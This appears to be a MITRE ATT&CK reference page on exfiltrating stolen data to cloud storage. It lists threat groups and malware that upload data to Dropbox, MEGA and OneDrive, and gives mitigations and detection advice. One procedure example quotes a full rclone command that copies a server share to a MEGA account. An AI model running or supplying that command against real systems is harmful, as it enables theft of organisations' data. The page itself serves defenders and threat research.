Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.ID:T1567.002Sub-technique of:T1567ⓘTactic:ExfiltrationⓘPlatforms:Linux, Windows, macOSVersion:1.2Created:09 March 2020Last Modified:15 September 2023Version PermalinkLive VersionProcedure ExamplesIDNameDescriptionG1024AkiraAkirawill exfiltrate victim data using applications such asRclone.[1]S0635BoomBoxBoomBoxcan upload data to dedicated per-victim folders in Dropbox.[2]S0651BoxCaonBoxCaonhas the capability to download folders' contents on the system and upload the results back to its Dropbox drive.[3]C0015C0015DuringC0015, the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using theRclonecommandrclone.exe copy --max-age 2y "\\SERVER\Shares" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M.[4]G0114ChimeraChimerahas exfiltrated stolen data to OneDrive accounts.[5]G1021Cinnamon TempestCinnamon Tempesthas uploaded captured keystroke logs to the Alibaba Cloud Object Storage Service, Aliyun OSS.[6]S0660ClamblingClamblingcan send files from a victim's machine to Dropbox.[7][8]G0142ConfuciusConfuciushas exfiltrated victim data to cloud storage service accounts.[9]S1023CreepyDriveCreepyDrivecan use cloud services including OneDrive for data exfiltration.[10]S0538CrutchCrutchhas exfiltrated stolen data to Dropbox.[11]G1006Earth LuscaEarth Luscahas used the megacmd tool to upload stolen files from a victim network to MEGA.[12]S0363EmpireEmpirecan use Dropbox for data exfiltration.[13]G0046FIN7FIN7has exfiltrated stolen data to the MEGA file sharing site.[14]G0125HAFNIUMHAFNIUMhas exfiltrated data to file sharing sites, including MEGA.[15]S0037HAMMERTOSSHAMMERTOSSexfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.[16]G1001HEXANEHEXANEhas used cloud services, including OneDrive, for data exfiltration.[10]G0094KimsukyKimsukyhas exfiltrated stolen files and data to actor-controlled Blogspot accounts.[17]G0065LeviathanLeviathanhas used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.[18][19]G1014LuminousMothLuminousMothhas exfiltrated data to Google Drive.[20]S0340OctopusOctopushas exfiltrated data to file sharing sites.[21]C0022Operation Dream JobDuringOperation Dream Job,Lazarus Groupused a custom build of open-source command-line dbxcli to exfiltrate stolen data to Dropbox.[22][23]S1102PcexterPcextercan upload stolen files to OneDrive storage accounts via HTTPPOST.[24]G1005POLONIUMPOLONIUMhas exfiltrated stolen data toPOLONIUM-owned OneDrive and Dropbox accounts.[10]S0629RainyDayRainyDaycan use a file exfiltration tool to upload specific files to Dropbox.[25]S1040RcloneRclonecan exfiltrate data to cloud storage services such as Dropbox, Google Drive, Amazon S3, and MEGA.[26][4]S0240ROKRATROKRATcan send collected data to cloud storage services such as PCloud.[27][28]G1015Scattered SpiderScattered Spiderhas exfiltrated victim data to the MEGA file sharing site.[29][30]G0027Threat Group-3390Threat Group-3390has exfiltrated stolen data to Dropbox.[7]G1022ToddyCatToddyCathas used a DropBox uploader to exfiltrate stolen files.[24]G0010TurlaTurlahas used WebDAV to upload stolen USB files to a cloud drive.[31]Turlahas also exfiltrated stolen files to OneDrive and 4shared.[32]G0102Wizard SpiderWizard Spiderhas exfiltrated stolen victim data to various cloud storage providers.[33]G0128ZIRCONIUMZIRCONIUMhas exfiltrated stolen data to Dropbox.[34]MitigationsIDMitigationDescriptionM1021Restrict Web-Based ContentWeb proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services.DetectionIDData SourceData ComponentDetectsDS0017CommandCommand ExecutionMonitor executed commands and arguments that may exfiltrate data to a cloud storage service rather than over their primary command and control channel.DS0022FileFile AccessMonitor for files being accessed to exfiltrate data to a cloud storage service rather than over their primary command and control channel.DS0029Network TrafficNetwork Connection CreationMonitor for newly constructed network connections to cloud services associated with abnormal or non-browser processes.Network Traffic ContentMonitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).Network Traffic FlowMonitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Monitor for cloud storages for data exfiltration.ReferencesSecureworks.
